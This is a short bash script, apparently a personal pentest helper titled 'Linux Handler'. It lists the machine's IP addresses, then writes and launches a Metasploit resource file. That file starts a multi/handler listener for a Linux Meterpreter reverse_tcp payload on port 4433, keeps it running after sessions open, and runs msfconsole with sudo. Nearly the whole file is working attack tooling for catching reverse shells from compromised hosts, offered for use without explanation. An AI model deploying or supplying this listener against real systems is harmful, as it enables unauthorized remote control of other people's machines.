cat << "EOF"
.____    .__         
|    |   |__| ____  __ _____  ___
|    |   |  |/    \|  |  \  \/  /
|    |___|  |   |  \  |  />    < 
|_______ \__|___|  /____//__/\_ \
        \/       \/\/
  ___ ___        .___.__    
 /   |   \_____    ____    __| _/|  |   ___________ 
/    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
\    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
 \___|_  /(____  /___|  /\____ | |____/\___  >__|   
       \/      \/     \/      \/           \/       
EOF

echo --------------------
ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo Wlan0 && echo --------------------
ifconfig vboxnet0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo vboxnet0 && echo --------------------
ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo tun0 && echo --------------------
echo --------------------

touch ~/Desktop/Tools/metasp/meterpreter2.rc
echo use exploit/multi/handler > ~/Desktop/Tools/metasp/meterpreter2.rc
echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/Tools/metasp/meterpreter2.rc
read -p 'Set LHOST IP: ' uservar
echo set LHOST $uservar >> ~/Desktop/Tools/metasp/meterpreter2.rc
echo set LPORT 4433 >> ~/Desktop/Tools/metasp/meterpreter2.rc
echo set ExitOnSession false >> ~/Desktop/Tools/metasp/meterpreter2.rc
echo exploit -j -z >> ~/Desktop/Tools/metasp/meterpreter2.rc
cat ~/Desktop/Tools/metasp/meterpreter2.rc
sudo msfconsole -r ~/Desktop/Tools/metasp/meterpreter2.rc
